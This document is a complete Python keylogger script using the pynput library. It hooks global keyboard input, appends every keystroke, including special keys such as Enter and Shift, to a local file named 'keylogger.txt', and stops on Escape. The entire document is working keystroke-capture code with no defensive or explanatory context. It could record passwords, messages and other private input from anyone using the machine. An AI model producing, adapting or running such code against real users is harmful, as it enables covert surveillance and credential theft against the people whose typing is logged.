from pynput import keyboard

# Define the path to the log file
log_file_path = "keylogger.txt"

def on_key_press(key):
    try:
        # Attempt to write the character to the log file
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Enter, Shift)
        with open(log_file_path, "a") as log_file:
            log_file.write(f"[{key}]")

def on_key_release(key):
    # Exit the logger when the Escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the key listener
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
